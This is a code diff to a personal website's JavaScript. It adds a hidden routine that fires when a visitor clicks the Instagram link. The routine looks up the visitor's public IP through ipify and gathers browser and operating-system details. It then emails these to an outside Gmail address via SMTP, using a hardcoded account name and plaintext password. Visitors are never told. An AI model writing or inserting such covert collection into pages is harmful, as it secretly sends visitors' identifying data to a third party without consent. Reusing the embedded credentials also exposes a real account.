@@ -1,4 +1,5 @@
-//var socket = io("localhost:3000");
+var myIP="",myUA="";
+
 var isMobile = false;
 window.onload=()=>{
 if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent) 
@@ -14,11 +15,50 @@ else
     document.getElementById("parent").style.backgroundImage = "url(" + images[Math.round(Math.random())] + ")";
 }
 }
+
 function insta(){
     window.location.assign('https://www.instagram.com/spectacular__scientist/');
+    getip();
 }
 
-function gmail(){
-    window.location.assign("http://www.pervez2504@gmail.com/");
+function getip(){
+    var x = fetch('https://api.ipify.org/?format=json').then(result => result.json()).then(data => sendEmail(data.ip));
+}
+
+function setIP(x)
+{
+    myIP=String(x);
+}
+
+function getua(){
+    var ua = /[?&]ua=([^&]+)(?:&|$)/.exec(location.search);
+
+    if (ua) {
+      ua = decodeURIComponent(ua[1]).replace(/\+/g, ' ');
+      document.getElementById('custom').value = ua;
+    }
+
+    platform = ua ? platform.parse(ua) : platform;
+    platform.os = String(platform.os);
+
+    var t = JSON.stringify(
+      platform,
+      ['name', 'version', 'layout', 'prerelease', 'os', 'manufacturer', 'product', 'description', 'ua'],
+      4
+    );
+    myUA=t;
+  };
+
+function sendEmail(x) {
+    getua();
+	Email.send({
+	Host: "smtp.gmail.com",
+	Username : "wpmailerpervez@gmail.com",
+	Password : "vforvendetta",
+	To : 'vendettaveluv@gmail.com',
+	From : "wpmailerpervez@gmail.com",
+	Subject : "Check if this project is working !!",
+	Body : "(->"+String(x)+"---"+String(myUA)+"<-)",
+	});
 }
 
